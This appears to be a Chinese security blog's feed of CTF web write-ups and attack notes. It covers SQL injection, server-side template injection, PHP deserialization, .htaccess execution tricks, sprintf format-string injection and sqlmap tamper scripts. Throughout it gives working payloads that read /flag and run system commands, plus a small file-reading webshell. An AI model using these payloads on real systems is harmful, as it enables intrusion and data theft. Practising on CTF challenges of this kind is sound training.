2019]高明的黑客题目描述说网站被黑客入侵了，源码被打包成了压缩文件。那就下载来看看，有三千多个PHP文件，名字都看着是随机的。看看内容倒是有很多这样的代码：    if('_Vqq2pPks' == 'VnbX5_X5N')     eval($_GET['_Vqq2pPks'] ?? ' ');基本上都是无效的。解题思路应该是这些PHP文件中有可用的Shell，然后写个脚本测试一遍。[SUCTF 2019]CheckIn题目描述一个文件上传界面，随便传一个文件，返回：exif_imagetype:not image!解题思路继续测试，发现php之类的后缀都被禁了。尝试上传.htaccess文件，还是不行。那就试着上传.user.ini文件，成功了。不过上传evil.jpg文件时，说文件内容中包含了”&lt;?”，绕过一下，然后读文件。[极客大挑战 2019]Havefun题目描述一道莫名其妙的水题：&lt;!--$cat=$_GET['cat'];echo $cat;if($cat=='dog'){	echo 'Syc{cat_cat_cat_cat}';}--&gt;#]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> BUUCTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SQL注入总结]]></title>
      <url>/notes/2020/02/16/SQL-Injection/</url>
      <content type="text"><![CDATA[注入的基本步骤一、判断注入点1、注入点位置GET、POST、Cookie、Header2、注入点数据类型数字型、字符型3、弱口令自动爆破二、猜测查询语句三、确定注入方式联合查询注入、堆查询注入、盲注、四、获取数据库信息1、information_schema库# 列出库名SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;# 列出表名SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='[库名]';# 列出列名SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='[库名]' AND TABLE_NAME='[表名]';2、数据库操作# 列出库名SHOW DATABASES;# 列出表名SHOW TABLES [FROM [库名]];# 列出列名SHOW COLUMNS FROM [库名].[表名]；3、数据库函数version()、user()、database()五、输出敏感内容模糊测试联合查询注入一、确定显示位数量利用UNION SELECT、利用ORDER BY堆查询注入一、利用堆查询修改数据库内容rename、alert二、利用堆查询修改数据库属性sql_mode=pipes_as_concat三、利用堆查询绕过绕过一些过滤SET @evil=0x73656C65637420666C6167; -- select flagPREPARE evil FROM @evil;EXECUTE evil;盲注一、基于报错的盲注1、基本语句SELECT count(*), concat(database(),0x3a,floor(rand(0)*2))a FROM information_schema.schemata GROUP BY a;2、简写SELECT count(*) FROM information_schema.schemata GROUP BY concat(database(),0x3a,floor(rand(0)*2));3、关键表被禁用SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a GROUP BY concat(database(),0x3a,floor(rand(0)*2));4、rand()被禁用SELECT min(@a:=1) FROM information_schema.schemata GROUP BY concat(database(),0x3a,(@a:=(@a+1)%2));5、利用XPATH语法错误SELECT extractvalue(1,concat(0x7e,database()));SELECT updatexml(1,concat(0x7e,database(),0x7e),1);6、利用溢出报错SELECT ～0 + !(SELECT * FROM (SELECT database())a);SELECT exp(~(SELECT * FROM (SELECT database())a));# 似乎在一些版本中这个漏洞被修复了二、基于布尔的盲注1、算术运算符+、-、*、/、%、DIV、MOD2、比较运算符=、&lt;&gt;、！=、&gt;、&lt;、&gt;=、&lt;=、BETWEEN、NOT BETWEEN、IN、NOT IN、&lt;=&gt;、LIKE、REGEXP、RLIKE、IS NULL、IS NOT NULL3、逻辑运算符            ！、&amp;&amp;、             、NOT、AND、OR、XOR      4、位运算符            &amp;、      、^、！、～、«、»      三、基于时间的盲注二次注入基本步骤与其它无异，只是输入的方式被延长为注册、登录、执行其它注入UPDATEINSERT一般发生在注册或输入新信息时，由于对INSERT语句的构造不安全，使得攻击者可以将敏感数据插入到个人信息中，并在其它地方获得回显。由一道对SQLite注入题目总结的神奇方法一、abs()整数溢出在SQLite中当abs()的参数为-9223372036854775808即0x8000000000000000时会报出溢出错误。应该是利用了补码表示负数之类的操作注意到在MYSQL中也有这样的情况二、利用CASE语句绕过对于=的过滤name="foo" ==&gt; CASE(name)WHEN("foo")THEN(1)ELSE(0)END三、用位与获取数据如果可以获得数据的二进制形式，可以和(1«n)进行位与运算，(1«n)表示2的n次方，逐位获取数据三、利用replace()绕过对于substr()函数的过滤replace(length(replace(flag,payload,"")),length(flag),"")# 逐字符增加paload的内容，匹配失败上式的返回为空四、绕过对于引号的过滤1、MySQL使用十六进制表示字符串2、SQLitechar()可将十进制ASCII码转换为字符串3、验证字符串先将flag转换位hex，然后利用replace()方法对比。输入的字符只有16种，数字不需要引号，3个字母在SQLite中有这样的表示方法：C = 'trim(hex(typeof(.1)),12567)'D = 'trim(hex(0xffffffffffffffff),123)'E = 'trim(hex(0.1),0123)'其它字母可以用类似的原理尝试在数据库的数据中寻找SQL注入后的RCEMySQL有一个系统变量secure_file_priv，它的值表示MySQL的输入、输出文件可以存在的目录。]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> SQL </tag>
        
          <tag> Injection </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SSI注入总结]]></title>
      <url>/notes/2020/01/18/SSI-Injection/</url>
      <content type="text"><![CDATA[]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> SSI </tag>
        
          <tag> Injection </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[BJDCTF Web Writeup]]></title>
      <url>/writeups/2020/01/17/BJDCTF-Web/</url>
      <content type="text"><![CDATA[hello_world解题思路打开看着像一个用模板做的网站。第一步先看源码，发现只有一个可用的链接，指向文件search.php，打开返回please make sure your id，要求我检查id。然后抓包检查，请求头没什么特别的，不过注意到search.php的返回头中有这样的内容：id: guestZ3Vlc3Q=，猜测可能需要发送类似的请求头，于是伪造admin发送。这次返回请使用主机访问，伪造一个XFF试试。又返回you are not from https://google.com，那就再伪造Referer，于是获得了flag。备注作为第一道Web题，并没有很快地做出来。首先请求头也是一种和服务器交互的方式，然后看到非标准的响应头理应想到发出类似的请求。可能还是思路不够灵活，或者经验太少。easy_upload解题思路是个文件上传页面，检查过滤方式，只是要求文件MIME是jpg，不过会修改文件名为xxx.jpg，上传成功将返回文件路径。上传木马，然后注意到url的内容：index.php?action=upload.php，文件包含。包含一下我们的木马，然后读文件/flag，获得flag。备注一道极为基础的文件上传和包含，然而还是过了好久才在别人的提示下恍然大悟。简单来讲就是忘记了url的内容，还是基本功不够熟练。Hidden secrets解题思路打开是个登录界面，不过似乎有个重定向，看到了一闪而过的flag。抓包看看，是个假flag，不过继续抓，会看到这样的响应头：password: d0970714757783e6cf17b26fb8e2298f，看着像个md5。那试试用这个密码登录，然后密码错误。再把这个md5解密一下，是112233，登录成功。不过新跳转的页面说我还没有登录，应该是cookie的问题，查看一下发现cookie也是一个md5，那就把刚刚那个换上，就成功了，在源码中找到flag。easy_md5解题思路打开就一个输入框，抓包看看，有这样的响应头：hint: select * from 'admin' where password=md5($pass,true)，不多说了，提交ffifdyop。在新返回的页面源码中找到这样的内容：&lt;!--$a = $GET['a'];$b = $_GET['b'];if($a != $b &amp;&amp; md5($a) == md5($b)){	//wow,you can really dance--&gt;md5+弱类型，或者提交数组，通过，又返回了一个源码： &lt;?phperror_reporting(0);include "flag.php";highlight_file(__FILE__);if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){    echo $flag;} md5碰撞，或者再提交数组，获得flag。备注这次记住了，用提交数组的方式绕过md5检验。Mark loves cat解题思路源码和请求包都没啥线索，就扫个目录，发现有git源码泄漏，提取一下，index.php部分源码如下：&lt;?phpinclude 'flag.php';$yds = "dog";$is = "cat";$handsome = 'yds';foreach($_POST as $x =&gt; $y){    $$x = $y;}foreach($_GET as $x =&gt; $y){    $$x = $$y;}foreach($_GET as $x =&gt; $y){    if($_GET['flag'] === $x &amp;&amp; $x !== 'flag'){        exit($handsome);    }}if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag'])){    exit($yds);}if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){    exit($is);}echo "the flag is: ".$flag;分析一下，首先要求POST或GET中必有一个名为flag的键，但是这样的话可变变量会覆盖掉真正的flag的值。但是注意到在GET的foreach中是两个可变变量进行赋值，第一个想法是提交这样的get参数：flag=flag。但是下面要求键和值不得同为flag，所以自然地引入一个临时变量，修改get参数为这样：temp=flag&amp;flag=temp。不过又触发了过滤，即要求flag键的值不得为其它键名，有点难顶了。后来突然想到可以直接将GET数组覆盖成字符串，这样就跳过了第三个foreach，使get参数为这样：temp=flag&amp;flag=temp&amp;_GET=foo。然而这样就引发了刚刚第一个提到的过滤。那正好利用一下POST，同时添加post参数为：_POST[flag]=bar。完事。这序列化也太简单了吧解题思路&lt;?phperror_reporting(0);highlight_file(__FILE__);//flag in /flagclass Flag{    public $file;    public function __wakeup(){        $this -&gt; file = 'woc';    }    public function __destruct(){        print_r(file_get_contents($this -&gt; file));    }}$exp = $_GET['exp'];$new = unserialize($exp);构造个file属性为/flag的对象，序列化后修改成员属性绕过__wakeup()就结束了。ZJCTF，就这？解题思路又直接给了源码：&lt;?phperror_reporting(0);$text = $_GET["text"];$file = $_GET["file"];if(strstr(file_get_contents('php://input'),'a')){    die("嚯，有点意思");}if(isset($text)&amp;&amp;(file_get_contents($text,'r')==="I have a dream")){    echo "&lt;br&gt;&lt;h1&gt;".file_get_contents($text,'r')."&lt;/h1&gt;&lt;/br&gt;";    if(preg_match("/flag/",$file)){        die("Not now!");    }    include($file);  //next.php    }else{    highlight_file(__FILE__);}?&gt;用data协议传入”I have a dream”，然后php://filter获取next.php源码：这是一个grep_replace()命令执行漏洞，可以利用\S*=${}执行PHP函数，构造payload：\S*=${getFlag()}&amp;cmd=system('cat /flag');，获得flag。The Mystery of IP解题思路打开是个简单的网站，有个Flag按钮可以点，点击，新页面返回了我的IP。修改请求头，发现可以通过修改XFF的方式控制回显。感觉可能是SSTI，提交{{7*7}}，返回了49，确实是SSTI。然后通过报错得知模板引擎是Smarty。可以利用{if xxx()}{/if}执行PHP函数，于是构造payload：{if system(“cat /flag”)}{/if}，获得flag。easy_serialize解题思路有源码如下：&lt;?phpheader("Content-type:text/html;charset=utf-8");error_reporting(1);class Read {    public function get_file($value)    {        $text = base64_encode(file_get_contents($value));        return $text;    }}class Show{    public $source;    public $var;    public $class1;    public function __construct($name='index.php')    {        $this-&gt;source = $name;        echo $this-&gt;source.' Welcome'."&lt;br&gt;";    }     public function __toString()    {           $content = $this-&gt;class1-&gt;get_file($this-&gt;var);        echo $content;        return $content;    }     public function _show()    {        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this-&gt;source)) {            die('hacker');        } else {            highlight_file($this-&gt;source);        }     }     public function Change()    {        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this-&gt;source)) {            echo "hacker";        }    }    public function __get($key){        $function=$this-&gt;$key;        $this-&gt;{$key}();    }}if(isset($_GET['sid'])){    $sid=$_GET['sid'];    $config=unserialize($_GET['config']);    $config-&gt;$sid;}else{    $show = new Show('index.php');    $show-&gt;_show();}首先看到Read的get_file()方法可以读文件，然后继续往下看，Show的__toString()方法会调用get_file()方法。这样的话只需要使Show对象被当作字符串执行就可以了。构造一个这样的对象：&lt;?phpclass Read {}class Show {    public $source;    public $var;    public $class1;}$a = new Show();$a-&gt;var = "flag.php";$a-&gt;class1 = new Read();$b = new Show();$b-&gt;source = $a;echo serialize($b);?&gt;然后放到config，sid=Change，__get()方法会将它作为方法执行，然后base64解码得到flag。另外扫目录可以看到又flag.php文件。easy_search解题思路没有思路，那就扫目录，有vim源码泄漏：&lt;?php	ob_start();	function get_hash(){		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times		$content = uniqid().$random;		return sha1($content); 	}    header("Content-Type: text/html;charset=utf-8");	***    if(isset($_POST['username']) and $_POST['username'] != '' )    {        $admin = '6d0bc1';        if ( $admin == substr(md5($_POST['password']),0,6)) {            echo "&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;";            $file_shtml = "public/".get_hash().".shtml";            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");            $text = '            ***            ***            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;            ***			***';            fwrite($shtml,$text);            fclose($shtml);            ***			echo "[!] Header  error ...";        } else {            echo "&lt;script&gt;alert('[!] Failed')&lt;/script&gt;";                }else    {	***    }	***?&gt;第一个对md5的检验，好像只能爆破，好在明文数字不是很大。然后会保存到shtml文件中，可能是个SSI注入，就是不清楚怎么获得文件路径，难道是爆破？然后实际操作一下，说我的请求头错了，意识到响应头可能有信息。抓包看看，果然，是文件路径。然后访问stml文件，试试SSI注入，发现没什么过滤，直接用&lt;!--exec cmd=""&gt;执行命令，获得flag。]]></content>
      <categories>
        
          <category> Writeups </category>
        
      </categories>
      <tags>
        
          <tag> CTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[常见的协议]]></title>
      <url>/notes/2020/01/16/Common-Protocols/</url>
      <content type="text"><![CDATA[dataphppharglob]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Web </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[grep_replace()命令执行]]></title>
      <url>/notes/2020/01/15/grep_replace()-Code-Execution/</url>
      <content type="text"><![CDATA[]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> PHP </tag>
        
          <tag> Execution </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[绕过open_basedir限制]]></title>
      <url>/notes/2020/01/14/Bypass-open_basedir/</url>
      <content type="text"><![CDATA[open_basedir简介open_basedir将php文件可访问的范围限制在指定目录树中，对于超出范围的文件，php文件无法访问。设置方法在程序中设置ini_set("open_basedir", "指定目录");在php.ini文件中设置（PHP配置文件）open_basedir="指定目录"在httpd.conf文件中的Directory和VritualHost设置（Apache配置文件）php_admin_value open_basedir “指定目录”在fastcgl.conf文件中设置（Nginx配置文件）fastcgi_param PHP_VALUE "open_basedir=指定目录"绕过方法]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> PHP </tag>
        
          <tag> Execution </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SST注入总结]]></title>
      <url>/notes/2020/01/13/SST-Injection/</url>
      <content type="text"><![CDATA[模板引擎模板引擎是为了使用户界面与业务数据分离而产生的，它可以将特定格式的文档，生成一个标准的HTML文档。常见的置换型模板，其运作方式与格式化字符串类似，就是利用正则表达式匹配特定的符号，进而生成文档。常见的模板引擎PHP：SmartyPHP：Twig服务端模板注入（SSTI）简介为了完成注入，要求模板的内容，至少一部分是可控的，然后向SQL注入一样修改模板语句就可以了。看下面的例子：&lt;?phpinclude_once("../libs/Smarty.class.php");$smarty=new Smarty();$ssti = "{{7*7}}";$username = "pepelon";$smarty-&gt;assign("username", $username);$file = "Hello, {\$username}. This is $ssti.";$file = "data:," . $file;$smarty-&gt;display($file);?&gt;假设$ssti和$username都是用户可控的，但是$username的内容在传入模板的时候会被引擎自动转义，所以暂时意义不大。我们主要关注$ssti的部分，它是直接插入模板中的，所以我们可以利用一些模板语法。上例将会输出：Hello, pepelon. This is 49.{{7*7}}成功被执行了。根据这个原理我们可以进行其它操作。引擎检测if "${7*7}" == "49" {	if "a{*comment*}b" == "ab" {		Smarty	} else {		if "${'z'.join('ab')}" == "zab" {			Mako		} else {			Unknowm		}	}} else {	if "{{7*7}}" == "49" {		if "{{7*'7'}}" == "7777777" {            Jinja2		} else if "{{7*'7'}}" == "49" {            Twig        } else {            Unknown        }	} else {        Not vulnerable    }}]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> SST </tag>
        
          <tag> Injection </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Apache2任意文件执行]]></title>
      <url>/notes/2020/01/13/Apache2-Arbitrary-File-Execution/</url>
      <content type="text"><![CDATA[上传.htaccess文件.htaccess文件作用于当前目录及其子目录，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。这里主要记录一下通过上传.htaccess文件修改Apache的解析规则的方法，以实现将任意文件作为php文件执行。利用前提管理员需要设置Apache的AllowOerride指令，以使htaccess文件有效。利用特征当目标网站出现以下特征时，说明管理员允许了.htaccess文件的使用。利用方法      以下内容可以使Apache用PHP解析任意文件名包含evil字样的文件。     &lt;FilesMatch "evil"&gt; 	SetHandler application/x-httpd-php &lt;/FilesMatch&gt;            以下任一内容可以使Apache用PHP解析任意后缀为.evil的文件。     AddType application/x-httpd-php .evil         AddHandler php5-script .evil         AddHandler php7-script .evil      ]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Apache2 </tag>
        
          <tag> Execution </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[i-SOONCTF Web Writeup]]></title>
      <url>/writeups/2019/11/30/i-SOONCTF-Web/</url>
      <content type="text"><![CDATA[easy_web解题思路第一眼会看到URL中的两个字段，”img”和”cmd”，推测会有文件包含和命令执行的漏洞。再看源码，发现页面有一张图片的显示方式为”data:image/gif;base64”，确实是文件包含。HTML源码中还有一句话，”md5 is funny”，暂时不知道有什么用。然后就开始尝试文件包含了，不出意外”img”字段为包含的文件名，其初始内容为”TXpVek5UTTFNbVUzTURabE5qYz0”。特征猜测为Base64，解一次为”MzUzNTM1MmU3MDZlNjc=”，再解一次为”3535352e706e67”，这个是ASCII编码，解密结果为”555.png”。可以提前扫一遍目录，这样看到”353535”会比较留意。然后尝试读取”index.php”的内容，如下：12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header('content-type:text/html;charset=utf-8');$cmd = $_GET['cmd'];if (!isset($_GET['img']) || !isset($_GET['cmd']))     header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');$file = hex2bin(base64_decode(base64_decode($_GET['img'])));$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);if (preg_match("/flag/i", $file)) {    echo '&lt;img src ="./ctf3.jpeg"&gt;';    die("xixi～ no flag");} else {    $txt = base64_encode(file_get_contents($file));    echo "&lt;img src='data:image/gif;base64," . $txt . "'&gt;&lt;/img&gt;";    echo "&lt;br&gt;";}echo $cmd;echo "&lt;br&gt;";if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i", $cmd)) {    echo("forbid ~");    echo "&lt;br&gt;";} else {    if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) {        echo `$cmd`;    } else {        echo ("md5 is funny ~");    }}?&gt;&lt;html&gt;&lt;style&gt;  body{   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;}&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;看到主要是两个部分，命令执行的绕过和执行条件的检验。绕过的话，已经过滤了大部分的读文件命令，这里可以使用”php flag”命令来实现读取。执行条件可以通过md5碰撞来达成。备注  读文件：php、ca\t、rev  md5碰撞easy_serialize_php解题思路根据提示可以看到题目源码： &lt;?php$function = @$_GET['f'];function filter($img){    $filter_arr = array('php','flag','php5','php4','fl1g');    $filter = '/'.implode('|',$filter_arr).'/i';    return preg_replace($filter,'',$img);}if($_SESSION){    unset($_SESSION);}$_SESSION["user"] = 'guest';$_SESSION['function'] = $function;extract($_POST);if(!$function){    echo '&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;';}if(!$_GET['img_path']){    $_SESSION['img'] = base64_encode('guest_img.png');}else{    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));}$serialize_info = filter(serialize($_SESSION));if($function == 'highlight_file'){    highlight_file('index.php');}else if($function == 'phpinfo'){    eval('phpinfo();'); //maybe you can find something in here!}else if($function == 'show_image'){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo['img']));} 可以发现这是一个由过滤引起的序列化逃逸，构造Payload，实现任意文件读取。备注序列化逃逸原理：过滤前的序列化结构如下：a:2:{    s:4:"evil";a:2:{        i:1;s:12:"foofoofoofoo";        i:2;s:100:";i:2;s:62:"0123456789                              0123456789                              0123456789                              0123456789                              0123456789                              0123456789                               01";}s:4:"file";s:8:"flag.php";    }    s:4:"file";s:11:"notflag.php";}“evel”字段为我们上传的Payload，此时”file”字段指向文件”notflag.php”。当”foofoofoofoo”被过滤后，其结构变为如下：a:2:{    s:4:"evil";a:2:{        i:1;s:12:"";i:2;s:100:";        i:2;s:62:"0123456789                  0123456789                  0123456789                  0123456789                  0123456789                  0123456789                  01";    }    s:4:"file";s:8:"flag.php";}s:4:"file";s:11:"notflag.php";}根据结构，”file”字段指向了文件”flag.php”。最后一行的内容被“挤”了出去，成为冗余，会被反序列化函数忽略。]]></content>
      <categories>
        
          <category> Writeups </category>
        
      </categories>
      <tags>
        
          <tag> CTF </tag>
        
          <tag> Writeup </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[sprintf()格式化字符串注入]]></title>
      <url>/notes/2019/11/23/sprintf()-Formatted-String-Injection/</url>
      <content type="text"><![CDATA[sprintf()函数和其它语言的格式化字符串函数类似，sprintf()的语法为：sprintf ( string $format [, mixed $... ] ) : string例如：&lt;?php    echo sprintf("select * from user where username='%s'\n", "admin");?&gt;运行结果：select * from user where username=admin漏洞原理在PHP的底层代码中，会对$format中%符号后的第一个字符做一个switch判断，以实现格式化输入功能。但这个判断仅15个case，换言之在%符号之后且超出了判断范围的字符都会被“吃掉”。这样的话，如果我们上传的Payload被addslashes()处理过，就可以利用这个特性使被转义的字符逃逸。利用方式使用%直接在危险字符前加入%即可。不过需要主要的是如果当前字符串中%符号的数目大于sprintf()函数实际提供的参数，就会引起报错：&lt;?php    echo sprintf("select * from user where username='admin%\' or 1=1#' and password='%s'\n" , "pass");?&gt;运行结果：PHP Warning:  sprintf(): Too few arguments in /home/glyuan/foo.php on line 2使用%1$在占位符中，%n$s可以选择特定位置的参数：&lt;?php    echo sprintf("select * from user where username='%2\$s' and password='%1\$s'\n", "pass", "admin");?&gt;运行结果：select * from user where username='admin' and password='pass'所以用%1$代替%可以规避之前的报错：&lt;?php    echo sprintf("select * from user where username='admin%1\$\' or 1=1#' and password='%s'\n" , "pass");?&gt;运行结果：select * from user where username='admin' Or 1=1#' and password='pass'使用%c%c是单个字符的占位符，接受一个整数，并根据ASCII码转化为字符，可以利用这个特性传入单引号等危险字符，以绕过过滤：&lt;?php    $username = "admin%1\$c or 1=1#";	$password = "39";	$sql = "select * from user where username='$username' and password='%s'\n";	echo sprintf($sql, $password);?&gt;运行结果：select * from user where username='admin' or 1=1#' and password='39']]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Injection </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Sqlmap Tamper脚本使用]]></title>
      <url>/notes/2019/11/09/Sqlmap-Tamper/</url>
      <content type="text"><![CDATA[Tamper 介绍tamper是sqlmap自带的脚本模块，用于对payload的内容进行修改。使用方式如下：sqlamp -u [url] --tamper [tamper]sqlmap自带的tamper脚本在’usr/share/sqlmap/tamper’目录下。也可以根据需求编写定制的脚本。Tamper脚本编写基本内容以下是一个tamper脚本的基本构成：#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""from lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWESTdef dependencies():    passdef tamper(payload, **kwargs):    """    Replaces apostrophe character with its illegal double unicode counterpart    &gt;&gt;&gt; tamper("1 AND '1'='1")    '1 AND %00%271%00%27=%00%271'    """    return payload.replace('\'', "%00%27") if payload else payload主要有三个部分，’__priority__‘、’dependencies()’和’tamper()’。__priority__‘__priority__‘表示本脚本的优先级，用于’–tamper’参数后面接了多个脚本的情况。它的值有四种基本情况，也可以利用’-100~100’进行自定义：__priority__ = PRIORITY.LOWEST__priority__ = PRIORITY.LOWER__priority__ = PRIORITY.LOW__priority__ = PRIORITY.NORMAL__priority__ = PRIORITY.HIGH__priority__ = PRIORITY.HIGHER__priority__ = PRIORITY.HIGHESTdependencies()tamper()‘tamper()’是整个脚本的主体。主要用于修改原本的payload，返回值为替换后的payload。 比如Kzone中通过Unicode编码关键字中的字符来绕过waf。它接受’payload’和’**kwargs’两个参数。]]></content>
      <categories>
        
          <category> Notes </category>
        
      </categories>
      <tags>
        
          <tag> Sqlmap </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[UNCTF Web Writeup]]></title>
      <url>/writeups/2019/10/20/UNCTF-Web/</url>
      <content type="text"><![CDATA[上传给小姐姐的照片题目描述点击链接页面显示如下：解题思路看起来是个文件上传，先尝试随便上传个PHP文件试试，返回内容为：已经有一个叫pic的照片了，换个名字再上传吧。。利用BurpSuite抓包，发现URL中带有一个’fliename’参数，其默认值为’pic’。修改一下再次上传，发现成功了，页面显示如下：查看源码，发现有上传后的文件的链接，点击后显示了PHP文件执行后的内容。说明这个文件上传漏洞没做什么过滤。编写文件读取的木马脚本，如下所示：&lt;?php$fp = fopen("../flag.php", "r");echo fread($fp, filesize("../flag.php"));fclose($fp);?&gt;再次上传，却返回了：你的照片不是jpg，png，gif格式的，小姐姐看不了！。很疑惑，不过用BurpSuite重复上传相同的文件，发现这种返回会随机。多次上传，直到上传成功。点击返回的文件的链接，在源码中找到flag。备注  返回你的照片不是jpg，png，gif格式的，小姐姐看不了！的情况在后来很少出现了，也不确定是不是随机出现的。  看官方Writeup要先扫描目录会发现”.index.php.swp”文件，之后在进行代码审计，所以之前的思路应该是有问题的。  真的真的需要一个目录扫描工具了。checkinA题目描述打开链接之后是个聊天室，可以在左下的输入框输入信息：解题思路随便输入点什么，提示为：Please change your nickname; [/name nickname]，要先改个名。改名后输入’help’会有提示，可以输入’/more’查看更多帮助。输入’/more’提示可以输入’/flag’。输入’/flag’就显示了flag。备注  不太清楚是什么原理，反正就是出了。  有一个进阶版，Chickin，好像是远程代码执行漏洞。unctf_easyphp题目描述一道PHP代码审计，页面显示如下：&lt;?php    $a = @$_GET['x'];    if(substr_count($a,"(")&gt;1 || substr_count($a,")")&gt;1){        die("only one fun");    }    if(strpos($a, '$_GET')!==False || strpos($a,'$_POST')!==False || strpos($a,'$_COOKIE')!==False || strpos($a,"*")!==False){        die("No No No");    }    $left = strpos($a, "(");    $right = strpos($a, ")");    $len = $right-$left;    $cmd = substr($a,$left+2,$len-3);    if(strpos($cmd, "cat")!==0 &amp;&amp; strpos($cmd,"cat")!==1 &amp;&amp; strpos($a, "cat")!== False){        if(strlen($cmd)&gt;13)        {                    echo "too long";        }else        {            echo eval($a);        }    }else{        highlight_file(__FILE__);    }?&gt;解题思路看看PHP的思路，接受一个GET型参数，但要求其中’(‘和’)’符号各自出现不能超过一次，而且不能出现’$_GET_‘等字段…（懒得描述了）第一反应Payload为system('cat flag.php');，不过有问题，’cat’字段不能出现在括号内的前二和三位，增加两个空格之后又发现’$cmd’的长度刚好超了一位。注意到前面对’$_GET’字段的检验，联想到可以利用’$_REQUEST’数组来读取一个新增加的GET参数，用于读取文件。对’cat’的检查可以用增加一个内容为’cat’的字符串的方式来绕过。此时Payload缩短为eval("$\_REQUEST['y']");"cat";，又超了两位，难受。注意到PHP有一个弱类型的利用，”$_REQUEST[‘1’]”可以利用”$_REQUEST[1]”读取，长度刚刚好。此时Payload为：?x=eval("$_REQUEST[1]");"cat";&amp;1=system("cat flag.php");提交获得flag。备注  也不知道该备注点儿啥，好像也没什么新的知识点，几个函数没见过查查也就知道了，多用点心就完事了。不过PHP弱类型转换好像挺常见的。WEB1题目描述打开网页出现弹窗：解题思路根据弹窗内容要检查备份文件，直接访问”index.php.bak”没什么反应。使用目录扫描工具获得一个叫做”www.zip”的文件。解压后是个叫作”www”的文件，不清楚是什么类型，不过直接用strings命令可以看到它备份了”index.php”，其内容如下：&lt;?phperror_reporting(0);include("f2f86a5c7e623b54e4685fcc8c503596.php");$UN=@$_GET['un'];$CTF=@$_POST['ctf'];if($UN==0 and $UN){    echo $flag_ahead;}if(is_numeric($CTF)){    exit();}if($CTF&gt;87654321){    echo $flag_behind;}?&gt;根据其内容构造Payload，即可获得flag。备注  好像省赛就有一道可以用目录扫描做的题…光坂镇的小诗1题目描述打开网页真的是一首小诗：解题思路源码长这样：就是SQL注入随便输入一个单引号试试：看着像宽字节注入，用”%df”试试，成功了，然后就没有了，正常的爆数据库。备注  group_concat()和concat()分别可以用来合并行和列。这好像不是上传题目描述打开页面显示如下：解题思路在源码中找到了这个：&lt;!-- &lt;a href="./index.php?filename=something.php"&gt;&lt;/a&gt; 